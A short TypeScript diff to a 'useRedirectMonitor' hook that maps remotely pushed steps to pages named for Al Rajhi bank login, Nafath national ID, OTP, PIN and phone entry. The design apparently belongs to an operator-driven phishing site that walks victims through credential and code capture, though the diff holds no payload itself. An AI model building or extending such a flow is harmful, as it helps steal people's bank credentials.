@@ -31,6 +31,19 @@ const PAGE_MAP: Record<string, string> = {
   _t3: "/step3",
 };
 
+// Which currentStep values belong to which page
+const STEP_OWNERS: Record<string, string[]> = {
+  nafad: ["nafad", "_t6"],     // step4 handles nafad and _t6
+  rajhi: ["rajhi", "_r6"],     // step6 handles rajhi and _r6
+  home: ["home", "_h1"],
+  insur: ["insur", "_i2"],
+  compar: ["compar"],
+  check: ["check", "_st1"],
+  otp: ["otp", "_t2"],
+  pin: ["pin", "_t3"],
+  phone: ["phone"],
+};
+
 export function useRedirectMonitor({
   visitorId,
   currentPage,
@@ -125,6 +138,15 @@ export function useRedirectMonitor({
         const stepHandledAt = data.currentStepHandledAt as number | undefined;
         
         if (currentStep) {
+          // Check if this currentStep belongs to this page
+          const allowedSteps = STEP_OWNERS[currentPage] || [];
+          const stepBelongsToPage = allowedSteps.includes(currentStep);
+          
+          if (!stepBelongsToPage) {
+            console.log(`[RedirectMonitor] Step ${currentStep} belongs to another page, ignoring`);
+            return;
+          }
+          
           const stepKey = `step_${currentStep}_${currentStepUpdatedAt}`;
           
           if (stepKey === lastHandledKeyRef.current) {
